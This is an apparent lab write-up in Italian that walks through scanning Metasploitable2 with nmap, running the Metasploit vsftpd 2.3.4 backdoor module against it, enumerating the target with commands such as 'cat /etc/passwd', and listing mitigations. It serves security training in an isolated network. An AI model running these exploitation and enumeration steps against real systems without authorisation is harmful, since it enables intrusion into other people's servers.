# Cybersecurity Metasploitable2 Lab — Sfruttamento VSFTPD 2.3.4

Guida pratica di **Penetration Testing** e **Vulnerability Assessment** in ambiente isolato con **Kali Linux** e **Metasploitable2**.  
L'obiettivo di questo laboratorio è documentare passo dopo passo le fasi di ricognizione, scansione dei servizi, sfruttamento di una vulnerabilità nota (**VSFTPD 2.3.4 Backdoor**) e analisi post-sfruttamento, includendo le relative misure di mitigazione e hardening.

> **Contesto didattico e uso etico:** Questo progetto è svolto esclusivamente a scopo educativo e formativo in un ambiente virtualizzato isolato (`VMware Host-only`) su macchine di test intenzionalmente vulnerabili. Non eseguire mai attività di scansione o exploitation su sistemi o reti senza esplicita autorizzazione.

---

## Cosa fa in breve questo laboratorio (e perché si parte da qui)

Immagina di dover valutare la sicurezza di un server esposto sulla rete prima che lo faccia un attaccante:
* Prima verifichi se l'host risponde e quali porte/servizi ha aperti (**ricognizione e scansione**).
* Poi cerchi se una versione software presenta falle note e provi a verificarne l'impatto in sicurezza (**sfruttamento**).
* Infine osservi cosa sarebbe accessibile sul sistema (**post-sfruttamento**) e definisci come chiudere la falla (**mitigazioni**).

Lavorare su una macchina vulnerabile come **Metasploitable2** in rete isolata permette di vedere dal vivo l'intero ciclo di un attacco e capire perché mantenere i servizi aggiornati, applicare il minimo privilegio e monitorare i log sia essenziale.

---

## Architettura e Ambiente di Test

Il laboratorio è configurato su **VMware** con una rete **Host-only**, così il traffico resta confinato tra macchina attaccante e macchina target senza esporre il target sulla rete domestica o aziendale.

| Componente | Ruolo | Indirizzo / Dettagli |
| :--- | :--- | :--- |
| **Kali Linux** | Macchina attaccante | `172.16.236.130` (rolling release, Nmap, Metasploit Framework) |
| **Metasploitable2** | Macchina target | `172.16.236.131` (VM intenzionalmente vulnerabile per formazione) |
| **VMware Host-only** | Rete isolata | Isolamento completo rispetto alla rete esterna/aziendale |

### Schema di rete

```text
┌──────────────────┐                     ┌──────────────────┐
│    Kali Linux    │◄──── Host-only ────►│  Metasploitable2 │
│  172.16.236.130  │       Adapter       │  172.16.236.131  │
└────────┬─────────┘                     └────────┬─────────┘
         │                                        │
         └───────────────────┬────────────────────┘
                     Rete Virtuale Isolata
```

---
## Passo 1 — Ricognizione (Reconnaissance)

L'obiettivo della prima fase è verificare che la macchina target sia attiva e raggiungibile sulla rete isolata.

### 1.1 Verifica con `ping`
```bash
ping 172.16.236.131
```

Output osservato:
```text
PING 172.16.236.131 (172.16.236.131) 56(84) bytes of data.
64 bytes from 172.16.236.131: icmp_seq=1 ttl=64 time=0.500 ms
64 bytes from 172.16.236.131: icmp_seq=2 ttl=64 time=0.350 ms
```

### Verifica e interpretazione
La ricezione delle risposte ICMP echo reply con latenza contenuta conferma che il target `172.16.236.131` è online e raggiungibile da Kali Linux.

---

## Passo 2 — Scansione dei Servizi e delle Vulnerabilità

Una volta confermata la raggiungibilità dell'host, si individuano le porte aperte e le versioni dei servizi in esecuzione.

### 2.1 Scansione completa delle porte e rilevamento versioni con `nmap`
```bash
nmap -sV -p- 172.16.236.131
```

* **`-sV`**: interroga i servizi sulle porte aperte per determinarne nome e versione.
* **`-p-`**: esegue la scansione su tutte le `65.535` porte TCP.

Output significativo:
```text
PORT      STATE  SERVICE     VERSION
21/tcp    open   ftp         vsftpd 2.3.4
22/tcp    open   ssh         OpenSSH 4.7p1
25/tcp    open   smtp        Postfix smtpd
```

### Verifica e interpretazione
La porta `21/tcp` espone il servizio FTP con versione **`vsftpd 2.3.4`**, nota per una backdoor critica introdotta nel codice sorgente distribuito nel 2011, che consente l'esecuzione di comandi remoti se attivata tramite l'invio di una sequenza specifica sul comando `USER`.

---

## Passo 3 — Sfruttamento (Exploitation) con Metasploit

In questa fase si utilizza **Metasploit Framework** (`msfconsole`) per individuare, configurare ed eseguire il modulo relativo alla backdoor di `vsftpd 2.3.4`.

### 3.1 Avvio di Metasploit e ricerca del modulo
```bash
msfconsole
search vsftpd
```

Risultato atteso:
```text
Matching Modules
================
   #  Name                                   Disclosure Date  Rank       Check
   0  exploit/unix/ftp/vsftpd_234_backdoor   2011-07-03       excellent  Yes
```

### 3.2 Selezione e configurazione dell'exploit
```text
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.16.236.131
show options
```

Opzioni verificate:
```text
Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   172.16.236.131   yes       The target host(s)
   LHOST    172.16.236.130   yes       The listen address
   LPORT    4444             yes       The listen port
```

### 3.3 Esecuzione del modulo
```text
run
```

Output registrato durante il test:
```text
[*] 172.16.236.131:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.16.236.131:21 - USER: 331 Please specify the password.
[+] 172.16.236.131:21 - Backdoor command executed successfully
[+] Exploit completed, but no session was created.
```

### Verifica e interpretazione
Il modulo invia la payload sul servizio FTP (`21/tcp`), ma in questa esecuzione il messaggio finale indica che **non è stata aperta una sessione interattiva** (`no session was created`). In un contesto reale o di laboratorio questo può accadere per fattori di rete/tempistica o perché la porta `6200` associata alla backdoor non è raggiungibile/aperta nel momento del tentativo; in tali casi si ricontrolla connettività, stato del servizio e configurazione del modulo.

---

## Passo 4 — Post-Sfruttamento (Post-Exploitation)

Una volta ottenuta una shell sul sistema target (in laboratorio o in un test autorizzato), la fase di post-sfruttamento serve a **verificare il livello di accesso**, **enumerare il contesto del sistema** e **valutare l'impatto potenziale** della compromissione.

### 4.1 Comandi di enumerazione sul target
```bash
# Visualizza la directory corrente
pwd

# Elenca file e directory nella cartella corrente
ls -l

# Verifica l'utente con cui si sta operando
whoami

# Consulta gli account locali del sistema
cat /etc/passwd

# Ispeziona la directory /home
cd /home
ls -la
```
### Come leggere i risultati
* **`whoami` e `pwd`**: permettono di capire subito con quali privilegi si opera (es. `root` o utente limitato) e in quale punto del filesystem ci si trova.
* **`cat /etc/passwd`**: consente di enumerare gli account utente locali e le relative shell configurate.
* **`ls -l` / `ls -la`**: aiuta a individuare file di configurazione, cartelle utente e possibili artefatti o dati sensibili.

*(Nota: in una valutazione di sicurezza l'obiettivo è documentare l'impatto e le vulnerabilità senza alterare o danneggiare il sistema.)*

---

## Passo 5 — Raccomandazioni e Mitigazioni

Per prevenire o ridurre l'impatto di vulnerabilità come quella su `vsftpd 2.3.4` e proteggere i servizi di rete:

* **Aggiornamenti software:** applicare regolarmente patch di sicurezza a sistema operativo e demoni di rete, evitando versioni non più manutenute o con CVE note.
* **Hardening e riduzione della superficie d'attacco:** disabilitare servizi non necessari o insicuri come FTP in chiaro e Telnet, sostituendoli con protocolli cifrati come **SFTP** e **SSH** (con autenticazione robusta / MFA dove applicabile).
* **Principio del minimo privilegio:** eseguire i servizi con utenti dedicati e privilegi minimi indispensabili, evitando l'esecuzione non necessaria come `root`.
* **Segmentazione e firewall:** limitare l'accesso alle porte e ai servizi soltanto agli IP o alle sottoreti autorizzate tramite regole di firewall.
* **Monitoraggio e logging:** centralizzare i log di sistema e di rete, monitorare i tentativi di accesso anomali e affiancare sistemi di rilevamento (**IDS/IPS**, come Suricata) per individuare scansioni o comportamenti sospetti.

---

## Strumenti e Risorse di Riferimento

### Strumenti utilizzati nel lab

| Strumento | Versione | Funzione nel laboratorio |
| :--- | :--- | :--- |
| **VMware** | — | Virtualizzazione e gestione della rete isolata `Host-only` |
| **Kali Linux** | Rolling | Piattaforma di test e analisi offensiva |
| **Metasploitable2** | `3.0.0` (lab VM) | Target virtuale deliberatamente vulnerabile per esercitazioni |
| **Nmap** | `7.x+` | Scansione porte TCP (`-p-`) e rilevamento versioni servizi (`-sV`) |
| **Metasploit Framework** | `6.x+` | Ricerca, configurazione ed esecuzione del modulo exploit |

### Risorse utili
* [Nmap Reference Guide](https://nmap.org/book/man.html) — Documentazione ufficiale su scansione di rete e rilevamento servizi.
* [Metasploit Documentation](https://docs.metasploit.com/) — Guida all'uso di `msfconsole`, moduli e gestione sessioni.
* [Kali Linux Documentation](https://www.kali.org/docs/) — Documentazione della distribuzione e dei tool inclusi.
* [GitHub Markdown Guide](https://docs.github.com/en/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax) — Riferimento per la formattazione su GitHub.

---

## Competenze Dimostrate in Questo Laboratorio

* Configurazione di un laboratorio virtualizzato isolato (`Host-only`) per test di sicurezza controllati.
* Esecuzione di ricognizione e scansione completa delle porte e delle versioni dei servizi con `Nmap` (`-sV -p-`).
* Individuazione, configurazione e test di un modulo exploit in `Metasploit` (`vsftpd_234_backdoor`), inclusa l'interpretazione del caso in cui non viene istanziata una sessione.
* Comprensione delle attività di enumerazione post-sfruttamento e definizione di contromisure concrete (aggiornamenti, hardening, firewall, minimo privilegio e monitoraggio IDS/IPS).
